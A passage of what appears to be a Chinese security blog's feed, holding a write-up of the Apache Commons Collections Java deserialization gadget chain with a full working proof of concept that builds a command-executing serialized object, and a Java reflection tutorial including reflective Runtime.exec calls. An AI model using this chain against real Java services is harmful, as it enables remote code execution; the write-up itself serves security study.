class="keyword">this</span>.<span class="built_in">map</span>.put(<span class="built_in">key</span>, value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.<span class="built_in">map</span>.<span class="built_in">get</span>(<span class="built_in">key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        我们可以看到<strong>get方法</strong>中如果没有找到key的键值，就会调用<code>factory.transform(key);</code>,这里的factory变量属于Transformer接口类并且具体使用哪一个类来实例化对象是我们可控的。也就可以形成调用链。</p><p>那么如何去自动调用get()方法,跟进<code>TiedMapEntry</code>类</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TiedMapEntry(Map <span class="built_in">map</span>, <span class="keyword">Object</span> <span class="built_in">key</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">this</span>.<span class="built_in">map</span> = <span class="built_in">map</span>;</span><br><span class="line">  <span class="keyword">this</span>.<span class="built_in">key</span> = <span class="built_in">key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//toString方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">String</span> toString()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> getKey() + <span class="string">"="</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getKey方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> getValue()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.<span class="built_in">map</span>.<span class="built_in">get</span>(<span class="keyword">this</span>.<span class="built_in">key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>TiedMapEntry</code>中，构造时传入使用<code>LazyMap</code>，调用<code>tostring()</code>方法，然后紧接着就会调用LazyMap类对象的get方法。</p><p>​    那么到目前为止，我们仍然需要一个类可以在反序列化重写readObject()时可以自动调用toString方法。完整的利用链就可以形成。</p><h5 id="BadAttributeValueExpException类"><a href="#BadAttributeValueExpException类" class="headerlink" title="BadAttributeValueExpException类"></a>BadAttributeValueExpException类</h5><p>看到<code>BadAttributeValueExpException</code>的<code>readObject</code>反序列化方法，调用了<code>toString</code>方法。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObject(ObjectInputStream ois) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Long</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Float</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Double</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Byte</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Short</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Boolean</span>) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    其中 <code>valObj</code> 为构造的 <code>TiedMapEntry</code> 类的对象，可以看到其中调用了该类的 <code>toString</code> 函数。</p><p>​    所以，我们只要构造一个<code>BadAttributeValueExpException</code>对象，并注入我们精心制造的<code>TiedMapEntry</code>对象。就可在以在反序列时，执行任意命令。</p><h5 id="最后的POC"><a href="#最后的POC" class="headerlink" title="最后的POC"></a>最后的POC</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> Exec  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BadAttributeValueExpException getObject(<span class="keyword">final</span> String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">        <span class="comment">// inert chain for setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">                <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">        <span class="comment">// real chain for after setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">Runtime</span>.<span class="keyword">class</span>),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123;</span><br><span class="line">                        String.<span class="keyword">class</span>, <span class="keyword">Class</span>[].<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123;</span><br><span class="line">                        Object.<span class="keyword">class</span>, Object[].<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123; String.<span class="keyword">class</span> &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line">        <span class="keyword">Class</span>&lt;? <span class="keyword">extends</span> Transformer&gt; aClass = transformerChain.getClass();</span><br><span class="line"></span><br><span class="line">        Field iTransformers = aClass.getDeclaredField(<span class="string">"iTransformers"</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException calc = getObject(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();<span class="comment">//用于存放person对象序列化byte数组的输出流</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(calc);<span class="comment">//序列化对象</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray(); <span class="comment">//读取序列化后的对象byte数组</span></span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);<span class="comment">//存放byte数组的输入流</span></span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        Object o = objectInputStream.readObject(); <span class="comment">//将byte数组输入流反序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20201108124637.png" alt=""></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://b1ue.cn/archives/166.html" target="_blank" rel="noopener">https://b1ue.cn/archives/166.html</a></p><p><a href="https://www.mi1k7ea.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://www.secpulse.com/archives/137940.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/137940.html</a></p><p><a href="https://shaobaobaoer.cn/java-an-quan-xue-xi-bi-ji-si-apache-commons-collectionsfan-xu-lie-hua-lou-dong/" target="_blank" rel="noopener">https://shaobaobaoer.cn/java-an-quan-xue-xi-bi-ji-si-apache-commons-collectionsfan-xu-lie-hua-lou-dong/</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a></p><p><a href="https://www.xmanblog.net/java-deserialize-apache-commons-collections/" target="_blank" rel="noopener">https://www.xmanblog.net/java-deserialize-apache-commons-collections/</a></p><p><a href="https://lzwgiter.github.io/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://lzwgiter.github.io/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558#toc-0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于先知社区:&lt;a href=&quot;https://xz.aliyun.com/t/8500&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;从apache-commons-collections中学习java反序列化 - 先知社区 (aliyun.com
      
    
    </summary>
    
    
      <category term="java代码审计学习" scheme="https://shu1l.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="cc链" scheme="https://shu1l.github.io/tags/cc%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>“java学习--反射机制</title>
    <link href="https://shu1l.github.io/2020/11/25/java-xue-xi-fan-she-ji-zhi/"/>
    <id>https://shu1l.github.io/2020/11/25/java-xue-xi-fan-she-ji-zhi/</id>
    <published>2020-11-25T08:39:33.000Z</published>
    <updated>2020-11-25T09:20:52.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java学习–java反射机制"><a href="#Java学习–java反射机制" class="headerlink" title="Java学习–java反射机制"></a>Java学习–java反射机制</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        反射是Java中一种动态(运行时)，通过反射可以在java动态运行时，对于任意一个类，<strong>对象可以通过反射获取到他的类，类可以通过反射拿到所有方法(包括私有)</strong>，动态获取信息，以及动态调用对象的方法的功能称为java语言的反射机制。</p><h3 id="反射的具体使用步骤"><a href="#反射的具体使用步骤" class="headerlink" title="反射的具体使用步骤"></a>反射的具体使用步骤</h3><p>在调用<code>Java</code>反射机制，主要步骤包括：</p><ul><li>获取 目标类型的<code>Class</code>对象.</li><li>通过 <code>Class</code> 对象分别获取<code>Constructor</code>类对象、<code>Method</code>类对象 &amp; <code>Field</code> 类对象.</li><li>通过 <code>Constructor</code>类对象、<code>Method</code>类对象 &amp; <code>Field</code>类对象分别获取类的构造函数、方法&amp;属性的具体信息，并进行后续操作.</li></ul><h4 id="反射获取类的class对象"><a href="#反射获取类的class对象" class="headerlink" title="反射获取类的class对象"></a>反射获取类的class对象</h4><p>要想使用反射，我们首先需要获得代操作的类所对应的Clas对象。</p><p><strong>1.常用的获取Class对象有四种方法：</strong></p><ul><li><p>使用Class类的静态方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.String"</span>)</span>;</span><br></pre></td></tr></table></figure></li><li><p>使用类的.class语法</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> clz = <span class="keyword">String</span>.<span class="keyword">class</span>;</span><br></pre></td></tr></table></figure></li><li><p>使用对象的getClass()方法</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="keyword">new</span> <span class="keyword">String</span>(<span class="string">"Hello"</span>);</span><br><span class="line">Class clz = <span class="built_in">str</span>.getClass();</span><br></pre></td></tr></table></figure></li><li><p>Type语法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; classType = <span class="type">Boolean</span>.<span class="keyword">TYPE</span>; </span><br><span class="line">    <span class="keyword">System</span>.<span class="keyword">out</span>.println(classType);</span><br></pre></td></tr></table></figure></li></ul><h4 id="反射创建类对象"><a href="#反射创建类对象" class="headerlink" title="反射创建类对象"></a>反射创建类对象</h4><p>常用两种方法:</p><ul><li><p>通过 Class 对象的 newInstance() 方法，<strong>只能使用默认的无参数构造方法。</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clz = pen.<span class="keyword">class</span>;</span><br><span class="line">Pen pen = (pen)clz.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br></pre></td></tr></table></figure></li><li><p>通过 Constructor 对象的 newInstance() 方法,<strong>可以选择特定的构造方法。</strong></p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> clz = pen.<span class="keyword">class</span>;</span><br><span class="line"><span class="function"><span class="keyword">Constructor</span> <span class="title">constructor</span> = <span class="title">clz</span>.<span class="title">getConstructor</span><span class="params">()</span>;</span></span><br><span class="line">Pen pen = (Pen)<span class="function"><span class="keyword">constructor</span>.<span class="title">newInstance</span><span class="params">()</span>;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="反射获取并调用类的构造函数-Constructor"><a href="#反射获取并调用类的构造函数-Constructor" class="headerlink" title="反射获取并调用类的构造函数(Constructor)"></a>反射获取并调用类的构造函数(Constructor)</h4><h5 id="1-获取所有公有构造函数"><a href="#1-获取所有公有构造函数" class="headerlink" title="1.获取所有公有构造函数"></a>1.获取所有公有构造函数</h5><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Constructor</span>[] <span class="title">conArray</span> = <span class="title">clazz</span>.<span class="title">getConstructors</span><span class="params">()</span>;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="function"><span class="keyword">Constructor</span> <span class="title">c</span> :</span> conArray)<span class="comment">&#123;</span></span><br><span class="line"><span class="comment">System.out.println(c);</span></span><br></pre></td></tr></table></figure><h5 id="2-获取所有的构造函数-包括：私有、受保护、默认、公有"><a href="#2-获取所有的构造函数-包括：私有、受保护、默认、公有" class="headerlink" title="2.获取所有的构造函数(包括：私有、受保护、默认、公有)"></a>2.获取所有的构造函数(包括：私有、受保护、默认、公有)</h5><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conArray = clazz.getDeclaredConstructors();</span><br><span class="line"><span class="keyword">for</span>(<span class="function"><span class="keyword">Constructor</span> <span class="title">c</span> :</span> conArray)<span class="comment">&#123;</span></span><br><span class="line"><span class="comment">System.out.println(c);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><h5 id="3-获取公有、无参的构造函数"><a href="#3-获取公有、无参的构造函数" class="headerlink" title="3.获取公有、无参的构造函数"></a>3.获取公有、无参的构造函数</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Constructor con = clazz.get<span class="constructor">Constructor(<span class="params">null</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"con = "</span> + con);</span><br><span class="line">Object obj = con.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br></pre></td></tr></table></figure><h4 id="反射获取并调用类的成员方法-Method"><a href="#反射获取并调用类的成员方法-Method" class="headerlink" title="反射获取并调用类的成员方法(Method)"></a>反射获取并调用类的成员方法(Method)</h4><h5 id="1-反射有参数方法"><a href="#1-反射有参数方法" class="headerlink" title="1.反射有参数方法"></a>1.反射有参数方法</h5><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class a = Class.forName(<span class="string">"org.xiaopan.fanshe.Pen"</span>);</span><br><span class="line">Pen pen =(Pen) a.<span class="keyword">new</span><span class="type">Instance</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">String</span>[] b(<span class="keyword">String</span>[] b)</span><br><span class="line">Method m = a.getMethod(<span class="string">"b"</span>,<span class="keyword">String</span>[].class);<span class="comment">//获取方法，需要指定要获取的方法名</span></span><br><span class="line"><span class="keyword">String</span>[] strs = (<span class="keyword">String</span>[]) m.invoke(pen, <span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="keyword">new</span> <span class="type">String</span>[]&#123;<span class="string">"str1"</span>,<span class="string">"str2"</span>,<span class="string">"str3"</span>&#125;&#125;); <span class="comment">//使用new Object[]&#123;&#125;形式传入</span></span><br></pre></td></tr></table></figure><h5 id="2-反射无参数方法"><a href="#2-反射无参数方法" class="headerlink" title="2.反射无参数方法"></a>2.反射无参数方法</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> a = <span class="keyword">Class</span>.forName("org.xiaopan.fanshe.Pen");</span><br><span class="line">Pen pen =(Pen) a.newInstance();</span><br><span class="line"><span class="built_in">public</span> <span class="type">void</span> a()</span><br><span class="line"><span class="keyword">Method</span> m = a.getMethod("a", <span class="keyword">null</span>);</span><br><span class="line">m.invoke(pen,<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><h5 id="3-反射静态方法"><a href="#3-反射静态方法" class="headerlink" title="3.反射静态方法"></a>3.反射静态方法</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> a = <span class="keyword">Class</span>.forName(<span class="string">"org.fanshe.test.Pen"</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> c()</span><br><span class="line">Method m = a.getMethod(<span class="string">"c"</span>);</span><br><span class="line">m.invoke(<span class="keyword">null</span>); <span class="comment">//静态方法，直接调用，类对象传入null即可。</span></span><br></pre></td></tr></table></figure><h4 id="反射获取类的成员属性-amp-赋值-Field"><a href="#反射获取类的成员属性-amp-赋值-Field" class="headerlink" title="反射获取类的成员属性&amp;赋值(Field)"></a>反射获取类的成员属性&amp;赋值(Field)</h4><h5 id="1-反射公共属性"><a href="#1-反射公共属性" class="headerlink" title="1.反射公共属性"></a>1.反射公共属性</h5><p>通过Class对象的etFields() 方法获取 Class 类的属性。只能获取公有属性。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Pen</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">Field<span class="literal">[]</span> fields = clz.get<span class="constructor">Fields()</span>;</span><br><span class="line">for (Field field : fields) &#123;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(field.get<span class="constructor">Name()</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-反射私有属性"><a href="#2-反射私有属性" class="headerlink" title="2.反射私有属性"></a>2.反射私有属性</h5><p>通过Class 对象的 getDeclaredFields() 方法则可以获取包括私有属性在内的所有属性。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clz = <span class="module-access"><span class="module"><span class="identifier">Pen</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">Field<span class="literal">[]</span> fields = clz.get<span class="constructor">DeclaredFields()</span>;</span><br><span class="line">for (Field field : fields) &#123;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(field.get<span class="constructor">Name()</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反射调用Runtime-getRuntime执行本地代码"><a href="#反射调用Runtime-getRuntime执行本地代码" class="headerlink" title="反射调用Runtime,getRuntime执行本地代码"></a>反射调用Runtime,getRuntime执行本地代码</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Runtime类对象</span></span><br><span class="line">Class runtimeClass1 = <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>for<span class="constructor">Name(<span class="string">"java.lang.Runtime"</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取构造方法</span></span><br><span class="line">Constructor constructor = runtimeClass1.get<span class="constructor">DeclaredConstructor()</span>;</span><br><span class="line">constructor.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">Object runtimeInstance = constructor.<span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">Method runtimeMethod = runtimeClass1.get<span class="constructor">Method(<span class="string">"exec"</span>, String.<span class="params">class</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令执行结果</span></span><br><span class="line">InputStream <span class="keyword">in</span> = process.get<span class="constructor">InputStream()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出命令执行结果</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="module-access"><span class="module"><span class="identifier">IOUtils</span>.</span></span><span class="keyword">to</span><span class="constructor">String(<span class="params">in</span>, <span class="string">"UTF-8"</span>)</span>);</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    Java反射机制是Java动态性中最为重要的体现，利用反射机制我们可以轻松的实现Java类的动态调用。Java的大部分框架都是采用了反射机制来实现的(如:<code>Spring MVC</code>、<code>ORM框架</code>等)，Java反射在编写漏洞利用代码、代码审计、绕过RASP方法限制等中起到了至关重要的作用。</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/web/242967.html" target="_blank" rel="noopener">Java代码审计基础之反射 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/pange1991/article/details/81175350" target="_blank" rel="noopener">(4条消息) Java反射详解_潘建南的博客-CSDN博客</a></p><p><a href="https://juejin.cn/post/6844904005294882830#heading-11" target="_blank" rel="noopener">Java 反射由浅入深 | 进阶必备 (juejin.cn)</a></p><p><a href="https://javasec.org/javase/Reflection/Reflection.html" target="_blank" rel="noopener">Java反射机制 · 攻击Java Web应用-[Java Web安全] (javasec.org)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Java学习–java反射机制&quot;&gt;&lt;a href=&quot;#Java学习–java反射机制&quot; class=&quot;headerlink&quot; title=&quot;Java学习–java反射机制&quot;&gt;&lt;/a&gt;Java学习–java反射机制&lt;/h2&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="java代码审计学习" scheme="https://shu1l.github.io/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>kerberosating攻击学习</title>
    <link href="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/"/>
    <id>https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/</id>
    <published>2020-08-05T09:04:33.000Z</published>
    <updated>2020-11-25T09:12:36.408Z</updated>
    
